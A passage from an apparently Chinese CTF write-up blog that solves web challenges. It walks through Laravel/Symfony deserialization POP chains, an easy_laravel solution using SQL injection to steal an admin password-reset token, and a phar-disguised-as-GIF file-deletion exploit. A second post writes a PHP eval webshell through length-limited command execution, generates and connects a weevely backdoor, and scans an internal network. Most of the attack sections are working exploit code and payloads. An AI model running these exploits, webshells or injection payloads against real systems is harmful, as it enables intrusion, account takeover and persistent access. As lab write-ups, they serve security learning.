TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第二种pop链：</li></ul><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319143959880.png" alt></p><p>进入ProxyAdapter.php中，跟进doSave方法</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319144241780.png" alt></p><p>pop链图如下</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1796442865.png" alt></p><p>poc如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected $innerItem &#x3D; &#39;cat &#x2F;flag&#39;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line"></span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private $setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    public $deferred &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred &#x3D; array(&#39;a&#39; &#x3D;&gt; new \Symfony\Component\Cache\CacheItem);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>tips:</p><p>选中一个类文件，右键，选择diagrams-&gt;show diagrams,可以查看查看类的继承关系 </p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319145109768.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/104287956" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104287956</a></p></blockquote><h3 id="0x-02-护网杯-2018-easy-laravel"><a href="#0x-02-护网杯-2018-easy-laravel" class="headerlink" title="0x 02 [护网杯 2018]easy_laravel"></a>0x 02 [护网杯 2018]easy_laravel</h3><blockquote><p>题目环境说明：buuoj 上的复现，和原版的题目不是完全一样。原题使用的是 nginx + mysql的配置 而 buuoj 上的是 apache + sqlite配置环境</p></blockquote><ul><li>前置知识</li></ul><h4 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h4><p>这是在 PHP5.3 以上的一个依赖管理工具。感觉和 docker 很像，docker-compose 根据 <code>docker-compose.yml</code> 中配置的服务和镜像，生成虚拟机。PHP 中的 composer 则是根据 <code>composer.json</code> 加载配置的 php package</p><p>配置更新源，Composer 镜像站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><p>升级</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer self-update 或者 composer update --lock</span><br></pre></td></tr></table></figure><p>诊断命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer diagnose</span><br></pre></td></tr></table></figure><p>清除缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer clear</span><br></pre></td></tr></table></figure><p>根据 <code>composer.json</code> 安装 php package</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer install</span><br></pre></td></tr></table></figure><h4 id="Laravel中间件-Middleware"><a href="#Laravel中间件-Middleware" class="headerlink" title="Laravel中间件(Middleware)"></a>Laravel中间件(Middleware)</h4><p>在Laravel中起着过滤进入应用的HTTP请求对象(Request)和完善离开应用的HTTP响应对象(Reponse)的作用, 而且可以通过应用多个中间件来层层过滤请求、逐步完善相应。</p><p><img src="https://segmentfault.com/img/bV3mey" alt="图片描述"></p><ul><li>解题过程</li></ul><ol><li>打开后网页源码提示github上有源码。但是做题的时候源码已经没了，所以从题目环境中拖下来审计</li></ol><p>首先查看数据库文件，database/factories/ModelFactory.php中记录User的信息，发现用户名和email已知，密码是随机生成且进过经过 <code>bcrypt</code> 处理的，注入出来是没办法解开</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319223604248.png" alt></p><p>路由信息在routes/web.php中，对应的Controller在app/Http/Controllers/下对应的PHP文件。Upload和Flag只有admin用户可以访问。</p><ol start="2"><li>不难发现在 <code>App\Http\Controllers</code> 中的 <code>NoteController</code> 存在注入</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224015666.png" alt></p><p>由于数据库是sqlite，所以不能使用#，根据数据表可以有五个字段，进行联合注入，查看回显位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3,4,5--</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224543246.png" alt></p><p>得到回显位是第二位，由于admin用户的密码进过<code>bcrypt</code> 处理的，注入出来是没办法解开,根据存在的password_resets尝试注入出admin用户重置的token</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319224716167.png" alt></p><p>先发送重置邮件，生成token插入数据库中</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225039464.png" alt></p><p>然后进行SQL注入查询。payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;union select 1,token,3,4,5 from password_resets where email&#x3D;&#39;admin@qvq.im&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225523909.png" alt></p><p>然后访问 <a href="http://url/password/reset/token" target="_blank" rel="noopener">http://url/password/reset/token</a> 即可重置密码</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319225818508.png" alt></p><p>然后改密码即可登入管理员，但是flag下面是<code>no flag</code></p><p>题目提示是blade过期的问题，根据资料发现Blade 是 laravel 提供的一个简单强大的模板引擎。它不像其他流行的 PHP 模板引擎那样限制你在视图中使用原生的 PHP 代码，事实上它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变，这意味着 Blade 并没有给你的应用添加编译的负担。</p><p>那下一目标就是把缓存的文件删除掉。</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319230346302.png" alt></p><p>blade 缓存位置是 <code>storage/framework/views</code> apache 的默认目录是 <code>/var/www/html/</code> 在一起就是 <code>/var/www/html/storage/framework/views</code> 结合上面的 sha1 就是 <code>/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php</code></p><ol start="3"><li>接来下是寻找pop链删除文件，这里发现<code>composer.json</code>中提供了大量组件，我们安装一下，然后全局搜索<code>unlink()</code>在<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php</code>中发现如下代码：</li></ol><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319230901785.png" alt></p><p>然后在 UploadController 中的 check() 函数中发现调用了 file_exists() 函数，并且两个参数都可控,可以触发phar反序列化</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231028491.png" alt></p><p>上传后的文件路径也可以得知</p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231117319.png" alt></p><p>构造exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $sequence = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $filters = [];</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $writeBuffer = <span class="string">''</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $mirrors = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> $_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_path;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> $_mode;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_reader;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> $_writer;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> $_quotes = <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> $_seekable = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path, $writable = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = $path;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = $writable ? <span class="string">'w+b'</span> : <span class="string">'rb'</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">'get_magic_quotes_runtime'</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $filePath = <span class="string">"/var/www/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($filePath, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的文件上传后，点击check抓包,添加path参数<code>phar:///var/www/html/storage/app/public/1.gif</code></p><p><img src="/2020/03/19/Laravel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20200319231622734.png" alt></p><p>提交以后模板文件就会被删除，我们访问/flag就会出现刷新以后的页面，即flag了</p><p>另外我在先知上看到有一个pop链可以rce，<a href="https://xz.aliyun.com/t/2901，有时间补一下，先占个坑" target="_blank" rel="noopener">https://xz.aliyun.com/t/2901，有时间补一下，先占个坑</a></p><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/peri0d/p/12512343.html" target="_blank" rel="noopener">https://www.cnblogs.com/peri0d/p/12512343.html</a></p><p><a href="https://tiaonmmn.github.io/2019/09/04/BUUOJ刷题-Web-easy-laravel/#more" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-laravel/#more</a></p><p><a href="https://www.anquanke.com/post/id/161849#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161849#h3-4</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
            <tag> Laravel反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由一道入群题学习内网渗透基础</title>
      <link href="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="题目名称：ctf473831530-2018-web-virink-web"><a href="#题目名称：ctf473831530-2018-web-virink-web" class="headerlink" title="题目名称：ctf473831530_2018_web_virink_web"></a>题目名称：ctf473831530_2018_web_virink_web</h3><ol><li>页面打开是源代码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&#39;orange&#39; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 20) &#123;</span><br><span class="line">        exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br &#x2F;&gt; IP : &#123;\$_SERVER[&#39;REMOTE_ADDR&#39;]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>利用<code>1=&gt;filename</code>的特性创建特殊的文件，然后<code>ls -tr</code>列文件拼出完整的shell。exp如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">base_url &#x3D; &#39;http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#39;</span><br><span class="line"></span><br><span class="line">def exec_cmd2(c):</span><br><span class="line">    # exec cmd</span><br><span class="line">    my_params &#x3D; &#123;</span><br><span class="line">        &#39;cmd&#39;: c</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">    print(&#39;exec cmd2&#39;, c, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_webshell():</span><br><span class="line">    filename &#x3D; [r&#39;&gt;echo\ \\&#39;, r&quot;&gt;\&#39;\&lt;\?php \\&quot;, r&#39;&gt;eval\(&#39;, r&#39;&gt;\$_POST\[c\]\)&#39;, r&quot;&gt;\;\&#39;\&gt;2.php&quot;]</span><br><span class="line">    for i in filename:</span><br><span class="line">        my_params &#x3D; &#123;</span><br><span class="line">            &#39;cmd&#39;: i</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.get(base_url, params&#x3D;my_params)</span><br><span class="line">        print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">    cmd_list &#x3D; [&#39;ls -tr&gt;1.sh&#39;, &#39;sh 1.sh&#39;]</span><br><span class="line">    for i in cmd_list:</span><br><span class="line">        exec_cmd2(i)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    write_webshell()</span><br><span class="line">    print(&#39;ok&#39;)</span><br></pre></td></tr></table></figure><ol start="3"><li>就可以成功写入一句话木马，通过小马利用蚁剑传一个大马上去(ps:这里使用的是kali自带的weevely3)</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &#x2F;home&#x2F;hw&#x2F;桌面&#x2F;1.php</span><br></pre></td></tr></table></figure><ol start="4"><li>结合提示python3以及flag不在此serve，可以想到需要内网渗透，但是tmd ifconfig等查ip的命令都被禁用了，这里可用cat /etc/hosts或者 cat /proc/net/fib_trie查看，另外包含phpinfo页面也可成功拿到本机ip</li></ol><p><img src="/2020/03/19/%E7%94%B1%E4%B8%80%E9%81%93%E5%85%A5%E7%BE%A4%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20200215224239332.png" alt></p><ol start="5"><li>使用weevely3连接大马，进行下一步操作</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http:&#x2F;&#x2F;d9cdeeab-00ae-45c0-bc56-45fb800d996a.node3.buuoj.cn&#x2F;sandbox&#x2F;0098771fc87704c388bc566c6cd8104b&#x2F;1.php pass</span><br></pre></td></tr></table></figure><p>上传一个ip&amp;port扫描的脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import telnetlib</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip):</span><br><span class="line">    server &#x3D; telnetlib.Telnet()</span><br><span class="line">    for port in [21, 22, 23, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 443, 873, 1433, 3306, 3389, 5432, 6082, 6379, 7001, 7002, 8000, 9000,9090, 8080, 8081, 8089, 9090, 27017, 27018]:</span><br><span class="line">        try:</span><br><span class="line">            server.open(ip, port)</span><br><span class="line">            print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">        except Exception as err:</span><br><span class="line">            #print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip, port))</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            server.close()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_open(q):</span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            ip &#x3D; q.get_nowait()</span><br><span class="line">            get_ip_status(ip)</span><br><span class="line">    except queue.Empty as e:</span><br><span class="line">        pass</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; []</span><br><span class="line">    ip &#x3D; sys.argv[1:]</span><br><span class="line">    ip &#x3D; &quot;&quot;.join(ip)</span><br><span class="line">    args &#x3D; &quot;.&quot;.join(ip.split(&quot;.&quot;)[:-1])</span><br><span class="line">    for i in range(1, 256):</span><br><span class="line">        host.append(&quot;&#123;off1&#125;.&#123;off2&#125;&quot;.format(off1&#x3D;args, off2&#x3D;i))</span><br><span class="line">    q &#x3D; queue.Queue()</span><br><span class="line">    for ip in host:</span><br><span class="line">        q.put(ip)</span><br><span class="line">    threads &#x3D; []</span><br><span class="line">    for i in range(10):</span><br><span class="line">        t &#x3D; threading.Thread(target&#x3D;check_open, args&#x3D;(q,))</span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line"> </span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>简易版本端口扫描：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    with open(&#39;active_port.txt&#39;,&#39;at&#39;) as f:</span><br><span class="line">        for i in range(65535+1):</span><br><span class="line">            ip &#x3D; &#39;172.64.152.4&#39;</span><br><span class="line">            try:</span><br><span class="line">                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+&#39;\n&#39;)</span><br><span class="line">            except socket.error:</span><br><span class="line">                pass</span><br><span class="line">        f.close()</span><br><span class="line">    